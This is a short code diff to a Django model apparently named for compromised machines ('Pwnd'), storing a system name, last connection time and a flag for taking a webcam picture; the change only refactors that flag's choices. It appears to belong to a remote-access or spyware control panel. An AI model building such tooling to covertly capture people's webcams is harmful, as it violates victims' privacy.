@@ -10,5 +10,8 @@ class Pwnd(models.Model):
     system = models.CharField(max_length=50)
     latest_connection = models.DateTimeField(default=datetime.datetime.now())
 
-    webcam_pic = [("true", "True"), ("false", "False")]
-    webcam = models.CharField(max_length=5, default="false", choices=webcam_pic)
+    class take_webcam_pic(models.TextChoices):
+        TRUE = "true"
+        FALSE = "false"
+
+    webcam = models.CharField(max_length=5, default=take_webcam_pic.FALSE, choices=take_webcam_pic.choices)
